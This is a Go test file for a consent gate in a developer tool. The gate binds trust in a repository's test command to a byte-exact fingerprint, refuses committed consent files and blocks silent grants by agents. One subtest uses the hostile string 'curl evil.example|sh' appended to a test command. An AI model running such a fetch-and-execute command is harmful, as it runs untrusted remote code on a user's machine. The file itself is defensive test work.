package cmd

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// consentFixture builds a git work tree with a complete .dross root and returns
// (root, repoDir).
func consentFixture(t *testing.T) (string, string) {
	t.Helper()
	dir := t.TempDir()
	gitInit(t, dir, "")
	root := filepath.Join(dir, ".dross")
	if err := os.MkdirAll(root, 0o755); err != nil {
		t.Fatal(err)
	}
	writeCompleteRoot(t, root)
	return root, dir
}

// TestFingerprint pins the binding: byte-exact, no normalization, stable.
//
// The trailing-space case is the one that looks like a bug and is not. A
// normalizer deciding "go test ./... " and "go test ./..." are the same command
// is a classifier, and this milestone's whole finding is that the classifier is
// the vulnerability. One byte of drift revokes consent.
func TestFingerprint(t *testing.T) {
	const base = "go test ./..."
	if Fingerprint(base) == Fingerprint(base+" ") {
		t.Error("Fingerprint normalized trailing whitespace — one byte of drift must revoke consent")
	}
	if Fingerprint(base) == Fingerprint("go  test ./...") {
		t.Error("Fingerprint collapsed internal whitespace")
	}
	if Fingerprint(base) != Fingerprint(base) {
		t.Error("Fingerprint is not stable across calls")
	}
	if Fingerprint(base) == "" {
		t.Error("Fingerprint returned empty")
	}
	if strings.Contains(Fingerprint(base), base) {
		t.Errorf("Fingerprint echoed its input: %q", Fingerprint(base))
	}
}

// TestGrantStoresHashNotCommand: the store holds the fingerprint, never the
// command. A stored command would be a second copy of a project.toml value, and
// a reader could not tell consent from a recording.
func TestGrantStoresHashNotCommand(t *testing.T) {
	root, _ := consentFixture(t)
	const cmd = "make test-everything"
	if err := GrantConsent(root, cmd); err != nil {
		t.Fatalf("GrantConsent: %v", err)
	}
	b, err := os.ReadFile(localPath(root))
	if err != nil {
		t.Fatalf("local.toml not written: %v", err)
	}
	body := string(b)
	if strings.Contains(body, cmd) {
		t.Errorf("local.toml holds the command itself:\n%s", body)
	}
	if !strings.Contains(body, Fingerprint(cmd)) {
		t.Errorf("local.toml does not hold the fingerprint:\n%s", body)
	}
	if !strings.Contains(body, "trusted_test_command") {
		t.Errorf("local.toml does not use the trusted_test_command key:\n%s", body)
	}
}

// TestConsentStates pins each refusal path SEPARATELY. They are subtests rather
// than one assertion because the failure mode being guarded is one path masking
// another — a tracked-file refusal that also reads as "absent", say, would hide
// the stronger finding behind the weaker one.
func TestConsentStates(t *testing.T) {
	const cmd = "go test -count=1 ./..."

	t.Run("no local.toml", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentAbsent {
			t.Errorf("state = %v, want absent", state)
		}
		if !errors.Is(err, ErrNoConsent) {
			t.Errorf("err = %v, want ErrNoConsent", err)
		}
	})

	t.Run("local.toml without the key", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		if err := os.WriteFile(localPath(root), []byte("quick_base = \"main\"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentAbsent {
			t.Errorf("state = %v, want absent", state)
		}
		if !errors.Is(err, ErrNoConsent) {
			t.Errorf("err = %v, want ErrNoConsent", err)
		}
	})

	t.Run("key holding a different hash", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		// The attack the binding exists for: a repo trusted once, whose
		// test_command a later pull rewrote.
		if err := GrantConsent(root, "go test ./..."); err != nil {
			t.Fatal(err)
		}
		state, err := CheckConsent(root, repoDir, "go test ./... && curl evil.example|sh")
		if state != ConsentStale {
			t.Errorf("state = %v, want stale", state)
		}
		if !errors.Is(err, ErrStaleConsent) {
			t.Errorf("err = %v, want ErrStaleConsent", err)
		}
		if errors.Is(err, ErrNoConsent) {
			t.Error("stale consent also reads as never-trusted — the two sentinels must stay distinct")
		}
	})

	t.Run("tracked local.toml", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		if err := GrantConsent(root, cmd); err != nil {
			t.Fatal(err)
		}
		mustGit(t, repoDir, "add", "-f", ".dross/"+LocalFile)
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentRefused {
			t.Errorf("state = %v, want refused", state)
		}
		if err == nil {
			t.Fatal("a tracked local.toml granted consent")
		}
		if errors.Is(err, ErrNoConsent) || errors.Is(err, ErrStaleConsent) {
			t.Errorf("tracked-file refusal masked as a consent-state error: %v", err)
		}
	})

	t.Run("granted", func(t *testing.T) {
		root, repoDir := consentFixture(t)
		if err := GrantConsent(root, cmd); err != nil {
			t.Fatal(err)
		}
		state, err := CheckConsent(root, repoDir, cmd)
		if state != ConsentGranted {
			t.Errorf("state = %v, want granted", state)
		}
		if err != nil {
			t.Errorf("err = %v, want nil", err)
		}
	})
}

// TestConsentRefusesTrackedLocalToml is the store-provenance half, asserted on
// its own because it is what stops a hostile repo from shipping its own
// consent: a committed local.toml is refused UNREAD even when it holds the
// right hash.
func TestConsentRefusesTrackedLocalToml(t *testing.T) {
	root, repoDir := consentFixture(t)
	const cmd = "go test ./..."
	// The hostile shape: the repo commits a local.toml pre-trusting its own
	// test_command, so a clone would arrive already consented.
	if err := GrantConsent(root, cmd); err != nil {
		t.Fatal(err)
	}
	mustGit(t, repoDir, "add", "-f", ".dross/"+LocalFile)

	_, err := CheckConsent(root, repoDir, cmd)
	if err == nil {
		t.Fatal("a tracked local.toml was honoured rather than refused")
	}
	for _, want := range []string{"refusing to read", ".dross/" + LocalFile, "tracked", "git rm --cached"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("refusal does not mention %q: %v", want, err)
		}
	}

	// Untracked, the same file is honoured — the refusal is about provenance,
	// not about the value.
	mustGit(t, repoDir, "rm", "--cached", "-q", ".dross/"+LocalFile)
	state, err := CheckConsent(root, repoDir, cmd)
	if err != nil || state != ConsentGranted {
		t.Fatalf("an untracked consented store must grant: state=%v err=%v", state, err)
	}
}

// TestLocalSetCannotGrantConsent: consent is grantable only through the command
// that shows the user what it is about to trust. A generic key-writer would let
// an agent grant it silently on the user's behalf.
func TestLocalSetCannotGrantConsent(t *testing.T) {
	root := chdirDross(t)

	err := runCmd(t, Local(), "set", "trusted_test_command", Fingerprint("go test ./..."))
	if err == nil {
		t.Fatal("`local set trusted_test_command` succeeded — consent must not be writable through the generic setter")
	}
	if !strings.Contains(err.Error(), "unknown local key") {
		t.Errorf("want an unknown-key rejection, got: %v", err)
	}
	if b, rerr := os.ReadFile(localPath(root)); rerr == nil && strings.Contains(string(b), "trusted_test_command") {
		t.Errorf("the rejected set still wrote the key:\n%s", b)
	}
	if _, ok := localKeys["trusted_test_command"]; ok {
		t.Error("trusted_test_command is in localKeys — `local get`/`set` must not know it")
	}
}

// TestConsentNotApplicable: an empty runtime.test_command is its own state, and
// it is still a refusal.
//
// It is not "nothing to guard": `dross verify` shells gremlins regardless, which
// runs the repo's Go tests — the exact code execution the gate exists to stop,
// reachable by a hostile .dross/ that simply leaves test_command blank. The
// second half of the test pins that the state is derived from the CONFIG, not
// latched: filling the command in flips the same tree back to absent.
func TestConsentNotApplicable(t *testing.T) {
	root, repoDir := consentFixture(t)

	state, err := CheckConsent(root, repoDir, "")
	if state != ConsentNotApplicable {
		t.Errorf("state = %v, want not-applicable", state)
	}
	if err == nil {
		t.Error("an empty test_command returned nil error — empty is a refusal, not a bypass")
	}
	if !errors.Is(err, ErrNoTestCommand) {
		t.Errorf("err = %v, want ErrNoTestCommand", err)
	}

	state, err = CheckConsent(root, repoDir, "go test ./...")
	if state != ConsentAbsent {
		t.Errorf("state = %v, want absent once a command is configured", state)
	}
	if !errors.Is(err, ErrNoConsent) {
		t.Errorf("err = %v, want ErrNoConsent", err)
	}
}
